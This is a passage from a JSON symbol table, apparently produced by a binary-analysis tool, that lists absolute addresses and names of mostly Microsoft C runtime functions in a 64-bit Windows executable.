            "name": "??$FindHandler@V__FrameHandler4@@@@YAXPEAUEHExceptionRecord@@PEA_KPEAU_CONTEXT@@PEAU_xDISPATCHER_CONTEXT@@PEAUFuncInfo4@FH4@@EH1@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442538144
            },
            "name": "??$TypeMatchHelper@V__FrameHandler3@@@@YAHPEBU_s_HandlerType@@PEBU_s_CatchableType@@PEBU_s_ThrowInfo@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442539364
            },
            "name": "??$__InternalCxxFrameHandler@V__FrameHandler4@@@@YA?AW4_EXCEPTION_DISPOSITION@@PEAUEHExceptionRecord@@PEA_KPEAU_CONTEXT@@PEAU_xDISPATCHER_CONTEXT@@PEAUFuncInfo4@FH4@@H1E@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442540560
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442542180
            },
            "name": "?ExFilterRethrowFH4@@YAHPEAU_EXCEPTION_POINTERS@@PEAUEHExceptionRecord@@HPEAH@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442542228
            },
            "name": "?FrameUnwindToState@__FrameHandler3@@SAXPEA_KPEAU_xDISPATCHER_CONTEXT@@PEBU_s_FuncInfo@@H@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442543400
            },
            "name": "?GetHandlerSearchState@__FrameHandler3@@SAHPEA_KPEAU_xDISPATCHER_CONTEXT@@PEBU_s_FuncInfo@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442543552
            },
            "name": "?IsInExceptionSpec@@YAEPEAUEHExceptionRecord@@PEBU_s_ESTypeList@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442543792
            },
            "name": "?Is_bad_exception_allowed@@YAEPEBU_s_ESTypeList@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442543928
            },
            "name": "?ReadEntry@UWMap4@FH4@@AEAAXPEAPEAE@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442544084
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442544096
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442544112
            },
            "name": "?getStartStop@UWMap4@FH4@@QEAAXHHAEAViterator@12@0@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442544596
            },
            "name": "__except_validate_context_record"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442544652
            },
            "name": "__vcrt_initialize_locks"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442544780
            },
            "name": "?try_get_function@@YAPEAXW4function_id@?A0xd4e49723@@QEBDQEBW4module_id@2@2@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442545116
            },
            "name": "__vcrt_FlsAlloc"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442545188
            },
            "name": "__vcrt_FlsFree"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442545260
            },
            "name": "__vcrt_FlsGetValue"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442545332
            },
            "name": "__vcrt_FlsSetValue"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442545416
            },
            "name": "__vcrt_InitializeCriticalSectionEx"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442545584
            },
            "name": "_CallSettingFrame"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442545648
            },
            "name": "_CallSettingFrame"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442545816
            },
            "name": "__acrt_initialize_stdio"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442546104
            },
            "name": "__acrt_iob_func"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442546124
            },
            "name": "__acrt_uninitialize_stdio"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442546216
            },
            "name": "_get_stream_buffer_pointers"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442546312
            },
            "name": "frexp"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442554636
            },
            "name": "?ContextToSize@CMFCColorBar@@QEAAXHH@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442557220
            },
            "name": "?write_string@?$string_output_adapter@D@__crt_stdio_output@@QEBAXQEBDHQEAHAEAV__crt_deferred_errno_cache@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442558156
            },
            "name": "free"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442558360
            },
            "name": "__acrt_call_reportfault"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442559076
            },
            "name": "_invalid_parameter_noinfo"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442559108
            },
            "name": "_invalid_parameter_noinfo_noreturn"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442559156
            },
            "name": "_invoke_watson"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442559228
            },
            "name": "localeconv"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442559280
            },
            "name": "calloc"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442559288
            },
            "name": "__acrt_errno_from_os_error"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442559468
            },
            "name": "__doserrno"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442559500
            },
            "name": "_errno"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442559868
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442561380
            },
            "name": "??$parse_floating_point_possible_infinity@DV?$c_string_character_source@D@__crt_strtox@@PEBD@__crt_strtox@@YA?AW4floating_point_parse_result@0@AEADAEAV?$c_string_character_source@D@0@PEBD@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442562196
            },
            "name": "??$parse_floating_point_possible_nan_is_ind@DV?$c_string_character_source@D@__crt_strtox@@@__crt_strtox@@YA_NAEADAEAV?$c_string_character_source@D@0@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442562268
            },
            "name": "??$parse_floating_point_possible_nan_is_snan@DV?$c_string_character_source@D@__crt_strtox@@@__crt_strtox@@YA_NAEADAEAV?$c_string_character_source@D@0@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442562340
            },
            "name": "??$parse_floating_point_write_result@M@__crt_strtox@@YA?AW4SLD_STATUS@@W4floating_point_parse_result@0@AEBUfloating_point_string@0@QEAM@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442562708
            },
            "name": "??$parse_floating_point_write_result@N@__crt_strtox@@YA?AW4SLD_STATUS@@W4floating_point_parse_result@0@AEBUfloating_point_string@0@QEAN@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442563188
            },
            "name": "??0_LocaleUpdate@@QEAA@QEAU__crt_locale_pointers@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442574036
            },
            "name": "memcpy_s"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442574188
            },
            "name": "_fgetc_nolock"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442574892
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442575356
            },
            "name": "ungetc"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442578324
            },
            "name": "rand"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442578816
            },
            "name": "?common_flush_all@@YAH_N@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442579264
            },
            "name": "_flushall"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442579984
            },
            "name": "fsetpos"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442580972
            },
            "name": "fgetpos"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442582700
            },
            "name": "fread"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442582732
            },
            "name": "fread_s"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442583344
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442583504
            },
            "name": "strcspn"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442584480
            },
            "name": "__acrt_initialize_locks"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442584552
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442584636
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442584664
            },
            "name": "_lock_locales"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442584716
            },
            "name": "??$?RV<lambda_e9ce07acdb0b138e546925ae9f1a2c9c>@@AEAV<lambda_2116bde18c9e5f34230805ea4a4660ed>@@V<lambda_5d037afbfc54bf1ca80d3d1ee4062886>@@@?$__crt_seh_guarded_call@PEAD@@QEAAPEAD$$QEAV<lambda_e9ce07acdb0b138e546925ae9f1a2c9c>@@AEAV<lambda_2116bde18c9e5f34230805ea4a4660ed>@@$$QEAV<lambda_5d037afbfc54bf1ca80d3d1ee4062886>@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442584780
            },
            "name": "??R<lambda_2116bde18c9e5f34230805ea4a4660ed>@@QEBAPEADXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442585448
            },
            "name": "setlocale"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442585524
            },
            "name": "__pctype_func"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442585584
            },
            "name": "islower"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442585760
            },
            "name": "isspace"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442585936
            },
            "name": "isupper"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442586104
            },
            "name": "___lc_codepage_func"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442586152
            },
            "name": "___lc_locale_name_func"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442586204
            },
            "name": "___mb_cur_max_func"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442587888
            },
            "name": "_wcsdup"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442588020
            },
            "name": "??$common_fsopen@D@@YAPEAU_iobuf@@QEBD0H@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442588524
            },
            "name": "tolower"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442588568
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442588592
            },
            "name": "abort"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442588680
            },
            "name": "__strncnt"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442588704
            },
            "name": "??$__acrt_convert_wcs_mbs_cp@D_WV<lambda_7c9dea7b4ca7285d2cdb541a38da6275>@@U__crt_win32_buffer_internal_dynamic_resizing@@@@YAHQEBDAEAV?$__crt_win32_buffer@_WU__crt_win32_buffer_internal_dynamic_resizing@@@@AEBV<lambda_7c9dea7b4ca7285d2cdb541a38da6275>@@I@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442589084
            },
            "name": "??$__acrt_convert_wcs_mbs_cp@_WDV<lambda_f788ae46380686e8b737efdd8c720d07>@@U__crt_win32_buffer_no_resizing@@@@YAHQEB_WAEAV?$__crt_win32_buffer@DU__crt_win32_buffer_no_resizing@@@@AEBV<lambda_f788ae46380686e8b737efdd8c720d07>@@I@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442589368
            },
            "name": "strnlen"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442589704
            },
            "name": "wcsnlen"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442591520
            },
            "name": "_cexit"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442591536
            },
            "name": "?NotifyClosed@COleServerDoc@@QEAAXXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442592012
            },
            "name": "__acrt_allocate_buffer_for_argv"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442592108
            },
            "name": "_configure_narrow_argv"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442592888
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442594012
            },
            "name": "_initialize_onexit_table"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442594052
            },
            "name": "_register_onexit_function"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442594124
            },
            "name": "initialize_global_variables"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442594144
            },
            "name": "initialize_c"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442594180
            },
            "name": "?StaticInitialize@CAtlStringMgr@ATL@@CA_NXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442594196
            },
            "name": "initialize_pointers"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442594260
            },
            "name": "uninitialize_vcruntime"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442594268
            },
            "name": "uninitialize_allocated_memory"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442594332
            },
            "name": "uninitialize_allocated_io_buffers"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442594464
            },
            "name": "__acrt_thread_detach"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442594480
            },
            "name": "__acrt_uninitialize"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442594536
            },
            "name": "?StaticInitialize@CAtlStringMgr@ATL@@CA_NXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442594596
            },
            "name": "strcpy_s"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442594896
            },
            "name": "strncmp"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442595024
            },
            "name": "wcsncmp"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442595068
            },
            "name": "_calloc_base"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442595304
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442596028
            },
            "name": "__acrt_EnumSystemLocalesEx"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442596220
            },
            "name": "__acrt_GetLocaleInfoEx"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442596684
            },
            "name": "__acrt_LCIDToLocaleName"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442597148
            },
            "name": "__acrt_can_use_vista_locale_apis"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442597196
            },
            "name": "__acrt_eagerly_load_locale_apis"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442597580
            },
            "name": "__acrt_uninitialize_winapi_thunks"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442597896
            },
            "name": "?initialize_inherited_file_handles_nolock@@YAXXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442598136
            },
            "name": "?initialize_stdio_handles_nolock@@YAXXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442598400
            },
            "name": "__acrt_initialize_lowio"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442598460
            },
            "name": "__acrt_uninitialize_lowio"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442598524
            },
            "name": "_errcode"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442598592
            },
            "name": "_except1"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442599592
            },
            "name": "_raise_exc"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442599632
            },
            "name": "_raise_exc_ex"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442600664
            },
            "name": "_decomp"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442601088
            },
            "name": "_clrfp"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442601120
            },
            "name": "_ctrlfp"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442601244
            },
            "name": "_set_statfp"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442601276
            },
            "name": "_statfp"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442601296
            },
            "name": "_malloc_base"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442604164
            },
            "name": "?should_round_up@@YA_NQEBN_KFW4__acrt_rounding_mode@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442606036
            },
            "name": "_get_printf_count_output"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442606400
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442606464
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442606528
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442606600
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442606696
            },
            "name": "?construct_ptd_array@@YAXQEAU__acrt_ptd@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442606904
            },
            "name": "?destroy_fls@@YAXPEAX@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442606936
            },
            "name": "?destroy_ptd_array@@YAXQEAU__acrt_ptd@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442607184
            },
            "name": "?replace_current_thread_locale_nolock@@YAXQEAU__acrt_ptd@@QEAU__crt_locale_data@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442607288
            },
            "name": "__acrt_freeptd"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442607356
            },
            "name": "?internal_getptd_noexit@@YAPEAU__acrt_ptd@@XZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442607732
            },
            "name": "?internal_getptd_noexit@@YAPEAU__acrt_ptd@@XZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442608124
            },
            "name": "__acrt_initialize_ptd"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442608220
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442608536
            },
            "name": "??$?RV<lambda_410d79af7f07d98d83a3f525b3859a53>@@AEAV<lambda_3e16ef9562a7dcce91392c22ab16ea36>@@V<lambda_38119f0e861e05405d8a144b9b982f0a>@@@?$__crt_seh_guarded_call@X@@QEAAX$$QEAV<lambda_410d79af7f07d98d83a3f525b3859a53>@@AEAV<lambda_3e16ef9562a7dcce91392c22ab16ea36>@@$$QEAV<lambda_38119f0e861e05405d8a144b9b982f0a>@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442608648
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442608692
            },
            "name": "??R<lambda_2a444430fde8c29194d880d93eed5e8f>@@QEBA@XZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442608836
            },
            "name": "?commit_locale_name@_expandlocale_locale_name_cache@@QEAAXQEB_W_K@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442608956
            },
            "name": "__acrt_copy_locale_name"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442609100
            },
            "name": "__acrt_uninitialize_locale"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442609148
            },
            "name": "__lc_lctowcs"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442609312
            },
            "name": "__lc_wcstolc"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442609672
            },
            "name": "_copytlocinfo_nolock"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442609864
            },
            "name": "_expandlocale"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442611016
            },
            "name": "_wcscats"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442611120
            },
            "name": "_wsetlocale"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442611284
            },
            "name": "_wsetlocale_get_all"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442611776
            },
            "name": "_wsetlocale_nolock"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442613276
            },
            "name": "parse_bcp47"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442613784
            },
            "name": "parse_bcp47_code_page"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442613856
            },
            "name": "parse_bcp47_language"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442614240
            },
            "name": "parse_bcp47_script"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442614492
            },
            "name": "iswctype"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442614600
            },
            "name": "_isctype_l"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442615820
            },
            "name": "__acrt_stdio_allocate_buffer_nolock"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442615928
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442616068
            },
            "name": "_commit"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442617360
            },
            "name": "?write_text_ansi_nolock@@YA?AUwrite_result@?A0x17268360@@HQEBDI@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442617620
            },
            "name": "?write_text_utf16le_nolock@@YA?AUwrite_result@?A0x17268360@@HQEBDI@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442617904
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442623156
            },
            "name": "_read_nolock"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442625024
            },
            "name": "?__acrt_stdio_free_stream@@YAXV__crt_stdio_stream@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442627924
            },
            "name": "__acrt_GetLocaleInfoA"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442628380
            },
            "name": "__acrt_GetStringTypeA"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442629600
            },
            "name": "__acrt_LCMapStringA"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442629752
            },
            "name": "wcscpy_s"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442629856
            },
            "name": "??$__acrt_stdio_parse_mode@D@@YA?AU__acrt_stdio_stream_mode@@QEBD@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442630564
            },
            "name": "_openfile"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442630720
            },
            "name": "_realloc_base"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442630916
            },
            "name": "__acrt_get_sigabrt_handler"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442630964
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442632000
            },
            "name": "__ascii_wcsicmp"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442632444
            },
            "name": "__acrt_initialize_timeset"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442632624
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442635620
            },
            "name": "?getSystemCP@@YAHH@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442635900
            },
            "name": "?setSBUpLow@@YAXPEAU__crt_multibyte_data@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442637012
            },
            "name": "?update_thread_multibyte_data_internal@@YAPEAU__crt_multibyte_data@@QEAU__acrt_ptd@@QEAPEAU1@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442637196
            },
            "name": "__acrt_initialize_multibyte"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442638024
            },
            "name": "?x_ismbbtype_l@@YAHPEAU__crt_locale_pointers@@IHH@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442638140
            },
            "name": "_ismbblead"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442638160
            },
            "name": "__acrt_initialize_command_line"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442638472
            },
            "name": "_recalloc_base"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442638624
            },
            "name": "__acrt_initialize_heap"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442639388
            },
            "name": "__acrt_lowio_create_handle_array"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442639556
            },
            "name": "__acrt_lowio_destroy_handle_array"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442639636
            },
            "name": "__acrt_lowio_ensure_fh_exists"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442639844
            },
            "name": "__acrt_lowio_set_os_handle"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442640076
            },
            "name": "_alloc_osfhnd"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442640396
            },
            "name": "_free_osfhnd"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442640584
            },
            "name": "_get_osfhandle"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442640720
            },
            "name": "_get_fpsr"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442640736
            },
            "name": "_set_fpsr"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442640800
            },
            "name": "__acrt_add_locale_ref"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442640940
            },
            "name": "__acrt_free_locale"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442641412
            },
            "name": "__acrt_locale_release_lc_time_reference"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442641452
            },
            "name": "__acrt_release_locale_ref"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442641620
            },
            "name": "__acrt_update_thread_locale_data"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442641732
            },
            "name": "_updatetlocinfoEx_nolock"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442642316
            },
            "name": "__acrt_fltout"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442647720
            },
            "name": "_isatty"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442650296
            },
            "name": "?initialize_lc_time@@YA_NQEAU__crt_lc_time_data@@QEAU__crt_locale_data@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442651128
            },
            "name": "__acrt_locale_free_time"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442651392
            },
            "name": "__acrt_locale_initialize_time"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442651548
            },
            "name": "wcscat_s"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442651668
            },
            "name": "wcsncat_s"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442652168
            },
            "name": "wcscspn"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442652232
            },
            "name": "wcspbrk"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442652284
            },
            "name": "GetLocaleNameFromDefault"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442652452
            },
            "name": "GetLocaleNameFromLangCountry"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442652660
            },
            "name": "GetLocaleNameFromLanguage"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442653548
            },
            "name": "LanguageEnumProcEx"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442654080
            },
            "name": "TranslateName"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442654864
            },
            "name": "CountryEnumProc"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442655096
            },
            "name": "GetLcidFromLangCountry"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442655304
            },
            "name": "GetLcidFromLanguage"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442655456
            },
            "name": "LangCountryEnumProc"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442656040
            },
            "name": "LanguageEnumProc"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442656384
            },
            "name": "ProcessCodePage"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442656740
            },
            "name": "TranslateName"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442656868
            },
            "name": "__acrt_get_qualified_locale_downlevel"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442658272
            },
            "name": "_putwch_nolock"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442658912
            },
            "name": "__ascii_wcsnicmp"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442658988
            },
            "name": "_wcsnicmp"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442659556
            },
            "name": "_strnicmp_l"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442660568
            },
            "name": "?decode_options@@YA?AUfile_options@?A0xa9d50aae@@HHH@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442661088
            },
            "name": "?truncate_ctrl_z_if_present@@YAHH@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442662880
            },
            "name": "qsort"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442663920
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442664080
            },
            "name": "strpbrk"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442665056
            },
            "name": "_mbsdec_l"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442665204
            },
            "name": "?initialize_multibyte@@YAHXZ"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442665228
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442665296
            },
            "name": "_controlfp_s"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442665396
            },
            "name": "fegetenv"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442665516
            },
            "name": "feholdexcept"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442665596
            },
            "name": "ceil"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442665792
            },
            "name": "log10"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442667244
            },
            "name": "?reset_and_return@__crt_mbstring@@YA_K_KPEAU_Mbstatet@@@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442667976
            },
            "name": "??$common_xtox_s@K_W@@YAHKQEA_W_KI_N@Z"
          },
          {
            "address": {
              "type": "absolute",
              "value": 6442668084
            },
            "name": "?"
          },
          {
            "address": {
              "type": "absolute",
